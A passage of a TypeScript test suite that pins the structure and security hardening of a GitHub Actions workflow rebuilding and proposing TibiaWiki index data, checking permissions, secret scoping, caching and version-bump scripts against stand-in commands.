import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { existsSync, readFileSync } from 'node:fs';
import { APP_TOKEN_ACTION, appTokenInputs, type Call, code, keys, read, runScripts, runStep, scalar, sortedLines, stepBody, stepIf, stepOutputs, stepIndex, stepInputs, stepName, steps, stepScript, under } from './workflow.ts';

/**
 * The drift workflow cannot run inside the suite, and its mistakes are quiet. A detector
 * that never sees a change looks exactly like a wiki that did not move, and a pull request
 * that does not bump the version merges without publishing. So its shape is pinned from
 * the file here, and every script that decides something runs against stand-in commands.
 */

const workflow = (): string => read('drift.yml');
const jobs = (): string => under(code(workflow()), 'jobs');
const buildJob = (): string => under(jobs(), 'build');
const prJob = (): string => under(jobs(), 'pr');
const alertJob = (): string => under(jobs(), 'alert');
const prStep = (id: string): string => steps(prJob())[stepIndex(steps(prJob()), id)]!;
const proposeStep = (): string => prStep('propose');
const waitStep = (): string => prStep('wait');

/** The lines of drift.yml, without comments, that match `pattern`, trimmed. */
const linesMatching = (pattern: RegExp): string[] =>
  code(workflow()).split('\n').filter((line) => pattern.test(line)).map((line) => line.trim());

/** How the build job's pin step moves the pin, and how the pr job recomputes that move on the lockfile alone. */
const PIN_ADD = 'pnpm add -D --save-exact "@tibia.sh/tibiawiki-mcp@$server"';
const RECOMPUTE_ADD = 'pnpm add -D --save-exact --lockfile-only --ignore-scripts --ignore-pnpmfile "@tibia.sh/tibiawiki-mcp@$SERVER"';

/**
 * What the pr job's pnpm/setup hashes for its cache key: a file the repository never holds. Even with install: false,
 * pnpm/setup restores its lockfile-verification cache whenever that hash is not empty, and the build job, which runs
 * the generator, could have planted the archive. So the job that gets the App token restores and saves no cache.
 */
const PR_NO_CACHE = '.pr-job-restores-no-cache';

/**
 * The scripts of the pr job's steps that check what the build job handed on, word for word. The build job runs
 * dependency code and the generator, so its outputs are data: these steps check each one whole, recompute the pin
 * themselves, keep the recompute to the two manifests and the one devDependency, and require the bytes the build job
 * built index.db with. A change to any of them has to change this test on purpose.
 */
const CHECK_RUN = String.raw`if [ "$CHANGED" != true ] && [ "$CHANGED" != false ]; then
  echo "changed is neither true nor false: '$CHANGED'" >&2
  exit 1
fi
if [ "$PIN_MOVED" != true ] && [ "$PIN_MOVED" != false ]; then
  echo "pin_moved is neither true nor false: '$PIN_MOVED'" >&2
  exit 1
fi
if [ "$CHANGED" = false ] && [ "$PIN_MOVED" = false ]; then
  echo "Neither the content nor the pin changed, so there is nothing to propose." >&2
  exit 1
fi
if [ "$LEVEL" != patch ] && [ "$LEVEL" != minor ]; then
  echo "level is neither patch nor minor: '$LEVEL'" >&2
  exit 1
fi
if [[ ! $SERVER =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  echo "Not a server version: '$SERVER'" >&2
  exit 1
fi
pin=$(node -p 'require("./package.json").devDependencies["@tibia.sh/tibiawiki-mcp"]')
decision=$(node scripts/server-pin.ts "$pin" "$pin" "$SERVER")
if [ "$PIN_MOVED" = true ] && [ "$decision" != "move $SERVER" ]; then
  echo "The build job moved the pin from $pin to $SERVER, which is not above it." >&2
  exit 1
fi
if [ "$PIN_MOVED" = false ] && [ "$decision" != "keep $pin" ]; then
  echo "The build job kept the pin at $SERVER, but main pins $pin." >&2
  exit 1
fi
`;
const RECOMPUTE_RUN = String.raw`if [[ ! $SERVER =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  echo "Not a server version: '$SERVER'" >&2
  exit 1
fi
${RECOMPUTE_ADD}
`;
const SCOPE_RUN = String.raw`files=$(git diff --name-only)
if [ "$files" != "$(printf 'package.json\npnpm-lock.yaml')" ]; then
  echo "The recompute changed other files than package.json and pnpm-lock.yaml:" >&2
  printf '%s\n' "$files" >&2
  exit 1
fi
git show HEAD:package.json > "$RUNNER_TEMP/main-package.json"
node -e '
  const fs = require("node:fs");
  const [main, server] = process.argv.slice(1);
  const name = "@tibia.sh/tibiawiki-mcp";
  const before = fs.readFileSync(main, "utf8");
  const after = fs.readFileSync("package.json", "utf8");
  const entry = (version) => JSON.stringify(name) + ": " + JSON.stringify(version);
  const parts = before.split(entry(JSON.parse(before).devDependencies[name]));
  if (parts.length !== 2) throw new Error("the package.json of main does not pin " + name + " exactly once");
  if (after !== parts.join(entry(server))) throw new Error("package.json changed in more than the pin of " + name);
' "$RUNNER_TEMP/main-package.json" "$SERVER"
`;
const MANIFESTS_RUN = String.raw`for value in "$PACKAGE_JSON_SHA256" "$PNPM_LOCK_SHA256"; do
  if [[ ! $value =~ ^[0-9a-f]{64}$ ]]; then
    echo "Not a SHA-256 hex digest: '$value'" >&2
    exit 1
  fi
done
sha256() {
  node -e 'process.stdout.write(require("node:crypto").createHash("sha256").update(require("node:fs").readFileSync(process.argv[1])).digest("hex"))' "$1"
}
package_json=$(sha256 package.json)
pnpm_lock=$(sha256 pnpm-lock.yaml)
if [ "$package_json" != "$PACKAGE_JSON_SHA256" ]; then
  echo "The recomputed package.json hashes to $package_json, but the build job built with $PACKAGE_JSON_SHA256." >&2
  exit 1
fi
if [ "$pnpm_lock" != "$PNPM_LOCK_SHA256" ]; then
  echo "The recomputed pnpm-lock.yaml hashes to $pnpm_lock, but the build job built with $PNPM_LOCK_SHA256." >&2
  exit 1
fi
echo "package.json and pnpm-lock.yaml are the ones the build job built index.db with."
`;

/**
 * The pr job's version step, word for word. A pin-only run keeps package.json's version, and that publishes nothing
 * only while npm lists the version already, so the step reads npm's list on both paths and fails closed.
 */
const VERSION_RUN = String.raw`name=$(node -p 'require("./package.json").name')
# The whole version list, read as release.yml reads it. npm exits non-zero when it
# cannot read the list, and node throws unless it got a non-empty one. Either
# assignment then ends this step red, so an outage never passes for an empty list.
versions=$(npm view "$name" versions --json)
version=$(node -e '
  const fs = require("node:fs");
  const [text, changed, level] = process.argv.slice(1);
  if (changed !== "true" && changed !== "false") throw new Error("changed is neither true nor false: " + changed);
  if (level !== "patch" && level !== "minor") throw new Error("level is neither patch nor minor: " + level);
  const list = JSON.parse(text);
  if (!Array.isArray(list)) throw new Error("npm printed no version list: " + text);
  const manifest = JSON.parse(fs.readFileSync("package.json", "utf8"));
  // Only x.y.z counts. release.yml cannot publish a prerelease, and npm leaves prereleases
  // out when it checks a new version against latest.
  const parse = (version) => /^(\d+)\.(\d+)\.(\d+)$/.exec(version)?.slice(1).map(Number);
  const current = parse(manifest.version);
  if (!current) throw new Error("package.json version " + manifest.version + " is not x.y.z");
  const missing = "npm does not list " + manifest.version + " from package.json yet. Let its release finish, or fix it, then run drift again.";
  if (changed === "false") {
    // A pin-only run keeps the version, which npm must list already.
    if (!list.includes(manifest.version)) throw new Error(missing);
    console.log(manifest.version);
  } else {
    // The package major is SCHEMA_VERSION. The suite in the build job checked that on this commit.
    const major = current[0];
    const highest = list.map(parse).filter((v) => v && v[0] === major).sort((a, b) => b[1] - a[1] || b[2] - a[2])[0];
    if (!highest) throw new Error("npm lists no " + major + ".x.y version");
    // Above the highest version npm lists in the major, so npm does not have it.
    const next = level === "minor" ? [major, highest[1] + 1, 0] : [major, highest[1], highest[2] + 1];
    // A next version at or below package.json means npm does not list that version yet, so
    // its release is pending or failed. A pull request that kept it would publish nothing
    // once that release lands.
    if (next[1] < current[1] || (next[1] === current[1] && next[2] <= current[2])) throw new Error(missing);
    manifest.version = next.join(".");
    fs.writeFileSync("package.json", JSON.stringify(manifest, null, 2) + "\n");
    console.log(manifest.version);
  }
' "$versions" "$CHANGED" "$LEVEL")
if [ "$CHANGED" = false ]; then
  echo "The content did not change, so the version stays $version, which npm lists, and nothing is published."
fi
echo "version=$version" >> "$GITHUB_OUTPUT"
`;

const DIGEST_A = '18ca2b2bf2c566fa6c7006977dea3558309bea165cb7d567daac1766a28bd27d';
const DIGEST_B = '95893758373511f414cf538f81b500c2c6bf9765704e0f0a0ff0aca9d21fbc61';

/** sha256 of the text `rebuilt index`, taken with shasum and openssl. */
const REBUILT_INDEX_SHA256 = '95893758373511f414cf538f81b500c2c6bf9765704e0f0a0ff0aca9d21fbc61';

/** What scripts/index-digest.ts could print instead of a digest, each of which must stop the run. */
const NOT_DIGESTS: Array<[string, string]> = [
  ['nothing', ''],
  ['63 hex characters', DIGEST_A.slice(1)],
  ['65 hex characters', `${DIGEST_A}0`],
  ['uppercase hex', DIGEST_A.toUpperCase()],
  ['a digest with a second line', `${DIGEST_A}\n${DIGEST_B}`],
  ['a prefixed digest', `sha256:${DIGEST_A}`],
];

/**
 * The checkout files that stand in for scripts/index-digest.ts: a script that prints `stdout`
 * when given index.db alone, and exits `exit`. `node` itself is not a stand-in command, so the
 * step runs this file with the real node. The package.json makes it an ES module, as this
 * repository's is, so the stand-in has no top-level return and no require.
 */
const fakeDigest = (stdout: string, exit = 0): Record<string, string> => ({
  'package.json': '{ "type": "module" }\n',
  'scripts/index-digest.ts':
    `if (process.argv.length !== 3 || process.argv[2] !== 'index.db') {\n  process.exitCode = 2;\n} else {\n` +
    `  process.stdout.write(${JSON.stringify(stdout)});\n  process.exitCode = ${exit};\n}\n`,
});

test('the workflow runs on Tuesdays and Fridays at 06:17 UTC, by hand and on a server release, and on nothing else', () => {
  // Twice a week. Daily would release almost every day, since the wiki is edited daily.
  assert.deepEqual(keys(under(code(workflow()), 'on')), ['schedule', 'workflow_dispatch', 'repository_dispatch'],
    'the drift workflow has a trigger other than its schedule, workflow_dispatch and repository_dispatch');
  // tibiawiki-mcp's release workflow sends server-release once npm accepted a publish.
  assert.deepEqual(sortedLines(under(under(code(workflow()), 'on'), 'repository_dispatch')), ['types: [server-release]'],
    'repository_dispatch starts drift on an event type other than server-release');
  const crons = [...workflow().matchAll(/^ *- *cron: *'([^']*)'(.*)$/gm)];
  assert.equal(crons.length, 1, 'expected exactly one cron schedule');
  assert.equal(crons[0]![1], '17 6 * * 2,5', 'the schedule is not Tuesdays and Fridays at 06:17 UTC');
  assert.match(crons[0]![2]!, /#.*\bTuesdays?\b.*\bFridays?\b/, 'the schedule comment does not name Tuesday and Friday');
});

test('no job in the drift workflow can mint an OIDC token', () => {
  // This workflow never publishes itself. A merge publishes through release.yml, and without
  // id-token a mistake here cannot publish either.
  assert.doesNotMatch(workflow(), /id-token/);
});

test('the drift workflow never publishes, and merges only through auto-merge in the propose step', () => {
  // A merge publishes through release.yml, so it has to wait for the checks the ruleset requires.
  // Auto-merge waits for them, and a held refresh turns it off. Nothing else here may merge.
  const body = code(workflow());
  for (const [what, pattern] of [
    ['npm publish', /\bnpm +publish\b/],
    ['the REST merge endpoint', /\/merge\b/],
    ['GraphQL auto-merge', /enablePullRequestAutoMerge/],
    ['an admin merge', /--admin\b/],
  ] as const) {
    assert.doesNotMatch(body, pattern, `the drift workflow runs ${what}`);
  }
  const merges = [...new Set([...body.matchAll(/\bgh +pr +merge\b.*$/gm)].map((match) => match[0].trim()))].sort();
  assert.deepEqual(merges, ['gh pr merge "$number" --auto --rebase', 'gh pr merge "$number" --disable-auto'],
    'the drift workflow merges in a way other than turning auto-merge on or off');
  const script = code(stepScript(workflow(), 'propose'));
  for (const merge of merges) assert.ok(script.includes(merge), `${merge} is not in the propose step`);
});

test('the workflow has a build, a pr and an alert job, and grants nothing by default', () => {
  assert.deepEqual(keys(jobs()), ['build', 'pr', 'alert']);
  assert.match(code(workflow()), /^permissions: *\{\}$/m, 'the workflow-level permissions grant something');
});

test('the build job can only read, and reads no secret', () => {
  // It runs the generator over content anyone can edit.
  assert.deepEqual(sortedLines(under(buildJob(), 'permissions')), ['contents: read'],
    'the build job does not hold exactly contents: read');
  assert.doesNotMatch(buildJob(), /\bsecrets\b|\bgithub\.token\b|^ *environment:/m, 'the build job reads a token');
});

test('only the pr job runs in the drift environment', () => {
  // The environment deploys from main alone, so the job that mints the App token never runs elsewhere,
  // whatever a job's if says.
  assert.equal(scalar(prJob(), 'environment'), 'drift', 'the pr job does not run in the drift environment');
  assert.deepEqual([...code(workflow()).matchAll(/^ *environment:.*$/gm)].map((match) => match[0].trim()), ['environment: drift'],
    'a job other than the pr job names an environment');
});

test("the App key is the one secret drift reads, and only the pr job's token step gets it", () => {
  // The key reaches the action as an input, the one place a secret is not in the env of the step that uses it.
  // The token it mints reaches the propose step alone, through its env: the steps before it, which read the
  // artifact and npm, never run with it, and neither does the wait.
  assert.deepEqual(linesMatching(/\bsecrets\b/), ['private-key: ${{ secrets.TIBIA_SH_APP_PRIVATE_KEY }}']);
  assert.deepEqual(linesMatching(/\bvars\b/), ['client-id: ${{ vars.TIBIA_SH_APP_CLIENT_ID }}']);
  const token = prStep('token');
  assert.equal(scalar(stepBody(token), 'uses')?.replace(/@.*$/, ''), APP_TOKEN_ACTION, 'the token step does not mint an App token');
  assert.deepEqual(sortedLines(stepInputs(token)),
    appTokenInputs('tibiawiki-data', { contents: 'write', 'pull-requests': 'write' }),
    'the token step does not ask for contents and pull requests write on tibiawiki-data alone');
  assert.equal(under(stepBody(token), 'env'), '', 'the token step has an env');
  assert.equal(stepIf(token), undefined, 'the token step has an if');
  const list = steps(prJob());
  assert.equal(stepIndex(list, 'propose'), stepIndex(list, 'token') + 1, 'the token step is not right before propose');
  assert.deepEqual(linesMatching(/\bsteps\.token\b/), ['GH_TOKEN: ${{ steps.token.outputs.token }}'],
    'the token is read somewhere other than one GH_TOKEN');
  assert.deepEqual(sortedLines(under(stepBody(proposeStep()), 'env')), [
    'CHANGED: ${{ needs.build.outputs.changed }}',
    'COMMITTED: ${{ needs.build.outputs.committed }}',
    'GH_TOKEN: ${{ steps.token.outputs.token }}',
    'GIT_AUTHOR_EMAIL: 41898282+github-actions[bot]@users.noreply.github.com',
    'GIT_AUTHOR_NAME: github-actions[bot]',
    'GIT_COMMITTER_EMAIL: 41898282+github-actions[bot]@users.noreply.github.com',
    'GIT_COMMITTER_NAME: github-actions[bot]',
    'HOLD: ${{ needs.build.outputs.hold }}',
    'REASONS: ${{ needs.build.outputs.reasons }}',
    'REBUILT: ${{ needs.build.outputs.rebuilt }}',
    'SERVER: ${{ needs.build.outputs.server }}',
    'VERSION: ${{ steps.version.outputs.version }}',
  ], 'the propose step does not get exactly the App token, its values and the commit identity');
  assert.doesNotMatch(stepScript(workflow(), 'propose'), /TIBIA_SH_APP|github\.token/, 'the propose script names a credential');
});

test('the merge wait reads with github.token', () => {
  // The App token expires an hour after it is minted, and the wait lasts up to 60 minutes after propose.
  // github.token reads the pull request for as long as the job runs, and pull-requests: read is all the wait
  // holds. It turns nothing on: auto-merge armed with github.token would merge as github-actions[bot], a push
  // that starts no release.yml.
  assert.deepEqual(sortedLines(under(prJob(), 'permissions')), ['contents: read', 'pull-requests: read'],
    'the pr job does not hold exactly contents: read and pull-requests: read');
  const list = steps(prJob());
  assert.equal(stepIndex(list, 'wait'), stepIndex(list, 'propose') + 1, 'the wait is not right after propose');
  assert.equal(list.length, stepIndex(list, 'wait') + 1, 'a step runs after the wait');
  const wait = waitStep();
  assert.equal(stepIf(wait), "${{ steps.propose.outputs.wait == 'true' }}", 'the wait does not run on propose handing on wait=true alone');
  assert.deepEqual(sortedLines(under(stepBody(wait), 'env')), [
    'CHANGED: ${{ needs.build.outputs.changed }}',
    'GH_TOKEN: ${{ github.token }}',
    'HEAD: ${{ steps.propose.outputs.head }}',
    'NUMBER: ${{ steps.propose.outputs.number }}',
    'VERSION: ${{ steps.version.outputs.version }}',
  ], 'the wait does not get exactly github.token and what propose handed on');
  assert.doesNotMatch(prJob().replace(wait, ''), /\bgithub\.token\b/, 'a pr job step other than the wait reads github.token');
});

test('the pr job waits for the build job, and runs only on main when the digests differ or the pin moved', () => {
  assert.equal(scalar(prJob(), 'needs'), 'build', 'the pr job does not need the build job');
  assert.equal(scalar(prJob(), 'if'),
    "${{ github.ref == 'refs/heads/main' && (needs.build.outputs.changed == 'true' || needs.build.outputs.pin_moved == 'true') }}",
    'the pr job is not gated on main and on a changed digest or a moved pin');
});

test('the pr job is bounded at 75 minutes, room for the 60 minute wait for the merge', () => {
  assert.equal(scalar(prJob(), 'timeout-minutes'), '75');
});

test('the alert job runs on main alone, after both jobs, when one did not succeed or the refresh was held', () => {
  // A dispatch from another branch builds, tests and guards, and alerts nothing. GitHub can report
  // a job that hit its timeout-minutes as cancelled rather than failed, so anything but success
  // alerts, except a pr job skipped because nothing changed.
  const alert = alertJob();
  assert.equal(scalar(alert, 'needs'), '[build, pr]', 'the alert job does not need both jobs');
  assert.equal(scalar(alert, 'if'),
    "${{ always() && github.ref == 'refs/heads/main' && (needs.build.result != 'success' || (needs.pr.result != 'success' && needs.pr.result != 'skipped') || needs.build.outputs.hold == 'true') }}",
    'the alert job is not gated on main and on a job that did not succeed or a hold');
  assert.equal(scalar(alert, 'runs-on'), 'ubuntu-latest');
  assert.equal(scalar(alert, 'timeout-minutes'), '5', 'the alert job is not bounded at 5 minutes');
});

test('the alert job holds exactly issues: write, checks nothing out and comments with github.token', () => {
  const alert = alertJob();
  assert.deepEqual(sortedLines(under(alert, 'permissions')), ['issues: write']);
  assert.doesNotMatch(alert, /^ *(?:- +)?uses:/m, 'the alert job runs an action');
  const list = steps(alert);
  assert.equal(list.length, 1, 'expected exactly one alert job step');
  stepIndex(list, 'alert');
  assert.deepEqual(keys(under(stepBody(list[0]!), 'env')).sort(), ['BUILD_RESULT', 'GH_TOKEN', 'HOLD', 'PR_RESULT', 'REASONS']);
  assert.equal(scalar(under(stepBody(list[0]!), 'env'), 'GH_TOKEN'), '${{ github.token }}', 'the alert step does not use github.token');
});

/** The concurrency of every job that writes the alert issue, as the workflows write it. */
const ALERT_CONCURRENCY = '{ group: automation-alert, cancel-in-progress: false, queue: max }';

test('the alert issue is titled Automation needs a look', () => {
  // One issue per repository, which drift.yml's alert job and alert.yml, for release.yml, both write. The two
  // jobs take turns in one group, and none replaces another's waiting run, so no alert is dropped and neither
  // opens the issue while the other does.
  for (const file of ['drift.yml', 'alert.yml']) {
    assert.match(stepScript(read(file), 'alert'), /^title='Automation needs a look'$/m, `${file} titles its issue otherwise`);
    const job = under(under(code(read(file)), 'jobs'), 'alert');
    assert.equal(scalar(job, 'concurrency'), ALERT_CONCURRENCY, `the alert job of ${file} does not queue in automation-alert`);
  }
});

test('drift runs take turns in their own concurrency group, and none is cancelled', () => {
  const concurrency = under(code(workflow()), 'concurrency');
  assert.match(concurrency, /^ *group: *drift$/m, 'the concurrency group is not drift');
  assert.match(concurrency, /^ *cancel-in-progress: *false$/m, 'cancel-in-progress is not false');
});

test('the build job is bounded in time', () => {
  // A wiki API that keeps answering 429 with a long Retry-After must end the run, red.
  assert.match(scalar(buildJob(), 'timeout-minutes') ?? '', /^[1-9]\d*$/, 'the build job has no timeout-minutes');
});

test('every action in the drift workflow is pinned to a full commit SHA, with its version beside it', () => {
  const uses = workflow().split('\n').filter((line) => /^ *(?:- +)?uses:/.test(line));
  assert.ok(uses.length > 0, 'drift.yml uses no actions, so this check proves nothing');
  for (const line of uses) {
    assert.match(line, /uses: *[\w.-]+\/[\w.-]+@[0-9a-f]{40} # v\d+\.\d+\.\d+$/, `${line.trim()} is not pinned to a SHA with its version`);
  }
});

test('no run script in the drift workflow interpolates an expression', () => {
  // Values reach the scripts through env:, so a crafted one is data, never code.
  const scripts = runScripts(workflow());
  assert.ok(scripts.length > 0, 'drift.yml has no run: scripts, so this check proves nothing');
  for (const script of scripts) {
    const line = script.split('\n').find((text) => text.includes('${{'));
    assert.equal(line, undefined, `a run: script interpolates an expression: ${line?.trim()}`);
  }
});

test('every checkout keeps no credentials and takes the commit that triggered the run', () => {
  // The build job rebuilds that commit, and the pr job commits on top of the same one.
  const checkouts = [...steps(buildJob()), ...steps(prJob())].filter((step) => /uses: *actions\/checkout@/.test(step));
  assert.equal(checkouts.length, 2, 'expected one checkout in each job');
  for (const step of checkouts) {
    assert.match(step, /^ *persist-credentials: *false$/m, 'a checkout leaves the token in .git/config');
    assert.doesNotMatch(step, /^ *ref:/m, 'a checkout takes a ref instead of the triggering commit');
  }
});

test("the only cache either job restores or saves is pnpm/setup's lockfile-verification record", () => {
  // A cache the build job saved after the generator ran would carry whatever that run left into
  // later runs, and into ci.yml. setup-node and setup-uv cache by themselves unless told not to.
  // pnpm/setup restores and saves its lockfile-verification record whatever its inputs say. The
  // record holds no package. With `install: true` the action saves it right after its frozen
  // install, before the generator runs, and its post step tries again at the end of the job only
  // when that save does not go through.
  const all = [...steps(buildJob()), ...steps(prJob())];
  assert.doesNotMatch(all.join('\n'), /uses: *actions\/cache/, 'a step uses actions/cache');
  const nodes = all.filter((step) => /uses: *actions\/setup-node@/.test(step));
  assert.equal(nodes.length, 2, 'expected one setup-node in each job');
  for (const step of nodes) {
    const inputs = stepInputs(step);
    assert.equal(scalar(inputs, 'package-manager-cache'), 'false', 'setup-node caches the package manager store');
    assert.equal(scalar(inputs, 'cache'), undefined, 'setup-node restores a dependency cache');
  }
  const uvs = all.filter((step) => /uses: *astral-sh\/setup-uv@/.test(step));
  assert.equal(uvs.length, 1, 'expected one setup-uv, in the build job');
  assert.equal(scalar(stepInputs(uvs[0]!), 'enable-cache'), 'false', 'setup-uv caches');
  const pnpms = steps(buildJob()).filter((step) => /uses: *pnpm\/setup@/.test(step));
  assert.equal(pnpms.length, 1, 'expected one pnpm/setup in the build job');
  const inputs = stepInputs(pnpms[0]!);
  assert.equal(scalar(inputs, 'cache'), undefined, 'pnpm/setup caches the pnpm store');
  assert.equal(scalar(inputs, 'install'), 'true',
    'pnpm/setup saves its lockfile-verification record only at the end of the job, after the generator ran');
  // The one exception is the pr job's, which restores and saves nothing: see the test of its inputs.
  assert.equal(steps(prJob()).filter((step) => /uses: *pnpm\/setup@/.test(step)).length, 1, 'expected one pnpm/setup in the pr job');
});

test('the build job installs an exact uv version', () => {
  // setup-uv checks a download only against the checksums it ships, which stop at the uv
  // versions out when that setup-uv was released. It skips the check for any later uv, and
  // `latest` or a range can resolve to one.
  const uvs = steps(buildJob()).filter((step) => /uses: *astral-sh\/setup-uv@/.test(step));
  assert.equal(uvs.length, 1, 'expected one setup-uv, in the build job');
  assert.match(uvs[0]!, /^ *version: *'?\d+\.\d+\.\d+'?$/m, 'setup-uv does not install an exact uv version');
});

test('the drift workflow leaves the PyPI cooldown to scripts/build.ts', () => {
  // build.ts gives build-index a default UV_EXCLUDE_NEWER, and the environment wins over it.
  // One set anywhere in this workflow would replace that default without failing a check.
  assert.doesNotMatch(code(workflow()), /UV_EXCLUDE_NEWER/, 'drift.yml sets UV_EXCLUDE_NEWER');
});

test('the build job digests the committed index before build-index overwrites it', () => {
  const list = steps(buildJob());
  const committed = stepIndex(list, 'committed');
  const build = list.findIndex((step) => /\bpnpm build-index\b/.test(step));
  assert.notEqual(build, -1, 'the build job never runs pnpm build-index');
  assert.ok(committed < build, 'the committed digest is taken after build-index has overwritten index.db');
});

test("both digest steps run this repository's scripts/index-digest.ts on index.db", () => {
  // The same script digests both indexes, so a change to the script alone never opens a refresh.
  for (const id of ['committed', 'digests']) {
    const script = stepScript(workflow(), id);
    assert.match(script, /^\w+=\$\(node scripts\/index-digest\.ts index\.db\)$/m, `the ${id} step does not digest index.db with the script`);
    assert.doesNotMatch(script, /tibiawiki-mcp/, `the ${id} step still calls the server`);
  }
});

test("the server stays pinned exactly, and only drift's pin steps move it", () => {
  // The pinned server builds the index with build-index and validates it with serve, so which
  // server that is decides what the drift job publishes. `^0.3.0` could never reach 0.4, and
  // nothing moved it, so the drift job stayed on 0.3.1 while the server went to 0.10.0. An exact
  // pin says which server it is. The build job's pin step moves it with pnpm add --save-exact, and
  // the pr job recomputes that move on the lockfile alone, and nothing else in drift adds a package.
  const adds = runScripts(workflow()).flatMap((script) => script.split('\n').filter((line) => /\bpnpm +(?:add|install|i|update|up)\b/.test(line)))
    .map((line) => line.trim()).sort();
  assert.deepEqual(adds, [PIN_ADD, RECOMPUTE_ADD].sort(), 'drift changes the dependencies other than by its two pin steps');
  const manifest = JSON.parse(readFileSync(new URL('../package.json', import.meta.url), 'utf8')) as
    { devDependencies?: Record<string, string> };
  const pin = manifest.devDependencies?.['@tibia.sh/tibiawiki-mcp'];
  assert.match(pin ?? '', /^\d+\.\d+\.\d+$/, `@tibia.sh/tibiawiki-mcp is pinned as ${JSON.stringify(pin)}, not an exact version`);
});

test('the build job tests the rebuilt index, and uploads it only after that and only when it changed', () => {
  const list = steps(buildJob());
  const build = list.findIndex((step) => /\bpnpm build-index\b/.test(step));
  const suite = list.findIndex((step) => /^ *(?:- +)?run: *pnpm test$/m.test(step));
  const digests = stepIndex(list, 'digests');
  const uploads = list.flatMap((step, index) => (/uses: *actions\/upload-artifact@/.test(step) ? [index] : []));
  assert.notEqual(suite, -1, 'the build job never runs pnpm test');
  assert.ok(build < digests, 'the rebuilt digest is taken before build-index');
  assert.ok(build < suite, 'pnpm test runs before build-index, so it tests the committed index');
  assert.equal(uploads.length, 1, 'expected exactly one upload');
  assert.ok(suite < uploads[0]!, `${stepName(list[uploads[0]!]!)} uploads before pnpm test has passed`);
  // The pr job runs when the content changed or the pin moved, and downloads the artifact either way.
  assert.equal(stepIf(list[uploads[0]!]!), "${{ steps.digests.outputs.changed == 'true' || steps.pin.outputs.pin_moved == 'true' }}",
    'the upload is not gated on a changed digest or a moved pin');
  assert.equal(scalar(stepInputs(list[uploads[0]!]!), 'path'), 'index.db', 'the artifact holds more than index.db');
});

/** The build job's guard command, as the workflow runs it. */
const GUARD = 'node scripts/drift-guard.ts "$RUNNER_TEMP/committed.db" index.db';

test('the build job keeps a copy of the committed index before build-index overwrites it', () => {
  const list = steps(buildJob());
  const keep = list.findIndex((step) => /^ *cp index\.db "\$RUNNER_TEMP\/committed\.db"$/m.test(step));
  const build = list.findIndex((step) => /\bpnpm build-index\b/.test(step));
  assert.notEqual(keep, -1, 'the build job never copies index.db to $RUNNER_TEMP/committed.db');
  assert.ok(keep < build, 'the committed index is copied after build-index has overwritten it');
});

test('the build job runs the guard after the suite, and only when the content changed', () => {
  const list = steps(buildJob());
  const suite = list.findIndex((step) => /^ *(?:- +)?run: *pnpm test$/m.test(step));
  const guard = stepIndex(list, 'guard');
  assert.ok(suite < guard, 'the guard runs before pnpm test has passed');
  assert.equal(stepIf(list[guard]!), "${{ steps.digests.outputs.changed == 'true' }}", 'the guard is not gated on a changed digest');
  assert.ok(stepScript(workflow(), 'guard').includes(GUARD), `the guard step does not run ${GUARD}`);
});

/** A stand-in for scripts/drift-guard.ts that checks its arguments, prints `stdout` and exits `exit`. */
const fakeGuard = (stdout: string, exit = 0): string =>
  `const args = process.argv.slice(2);\n` +
  `if (args.length !== 2 || args[0] !== process.env.RUNNER_TEMP + '/committed.db' || args[1] !== 'index.db') { process.exitCode = 2; }\n` +
  `else { process.stdout.write(${JSON.stringify(stdout)}); process.exitCode = ${exit}; }\n`;

/** Runs the guard step with the stand-in guard, and reads the outputs it wrote. */
const runGuard = (stdout: string, exit = 0) => {
  const run = runStep(stepScript(workflow(), 'guard'), { files: { 'scripts/drift-guard.ts': fakeGuard(stdout, exit) } });
  const heredoc = /^reasons<<(\S+)\n(?:([\s\S]*?)\n)?\1\n/m.exec(run.output);
  return { ...run, hold: /^hold=(.*)$/m.exec(run.output)?.[1], delimiter: heredoc?.[1], reasons: heredoc ? heredoc[2] ?? '' : undefined };
};

const REASONS = 'item lost 150 of 9,800 rows (1.5%)\ntable npc_job is missing';

test('the guard step holds with the reasons the guard printed, and goes when it printed none', () => {
  const held = runGuard(`${REASONS}\n`);
  assert.equal(held.status, 0, held.log);
  assert.equal(held.hold, 'true');
  assert.equal(held.reasons, REASONS);
  assert.match(held.log, /npc_job is missing/, 'the step does not log the reasons');

  const go = runGuard('');
  assert.equal(go.status, 0, go.log);
  assert.equal(go.hold, 'false');
  assert.equal(go.reasons, '');
  assert.equal(go.output.split('\n').filter((line) => line.startsWith('hold=')).length, 1, 'hold is written more than once');
});

test('the guard step writes the reasons under a random delimiter', () => {
  // A fixed one could be ended early by a reason that holds it.
  const first = runGuard(`${REASONS}\n`);
  const second = runGuard(`${REASONS}\n`);
  assert.match(first.delimiter ?? '', /^\S{20,}$/, 'the delimiter is short enough to guess');
  assert.notEqual(first.delimiter, second.delimiter, 'two runs used the same delimiter');
});

test('the guard step fails, and writes no hold, when the guard cannot read an index', () => {
  // The guard prints nothing and exits 1, and an empty stdout must never read as go.
  const run = runGuard('', 1);
  assert.notEqual(run.status, 0, `the step passed when the guard failed\n${run.log}`);
  assert.equal(run.output, '', 'the step wrote an output when the guard failed');
  const partial = runGuard('item lost 150 of 9,800 rows (1.5%)\n', 1);
  assert.notEqual(partial.status, 0, `the step passed when the guard failed after printing\n${partial.log}`);
  assert.equal(partial.output, '', 'the step wrote an output when the guard failed after printing');
});

test('the pr job runs no pnpm script, and its one pnpm command recomputes the pin on the lockfile alone', () => {
  // R33: the job that can push runs only git, gh, npm view and node on its own checkout. pnpm add with
  // --lockfile-only, --ignore-scripts and --ignore-pnpmfile installs nothing and runs no dependency code.
  const pnpm = runScripts(prJob()).flatMap((script) => script.split('\n').filter((line) => /(?<![\w-])pnpm(?![\w-])/.test(line))).map((line) => line.trim());
  assert.deepEqual(pnpm, [RECOMPUTE_ADD], 'the pr job runs pnpm other than to recompute the pin');
  assert.doesNotMatch(prJob(), /\bnpx\b|\bnpm +(?:run|run-script|test|start|exec|install|i|ci)\b/);
});

test('every output and step value the jobs pass along is one that is written', () => {
  // A misspelt reference evaluates to an empty string, not an error. An empty `changed`
  // would skip the pr job forever, and look like a wiki that never moves.
  const outputs = under(buildJob(), 'outputs');
  const declared = new Map([...outputs.matchAll(/^ *([\w-]+): *\$\{\{ *steps\.([\w-]+)\.outputs\.([\w-]+)(?: *\|\| *'(?:false|patch)')? *\}\}$/gm)]
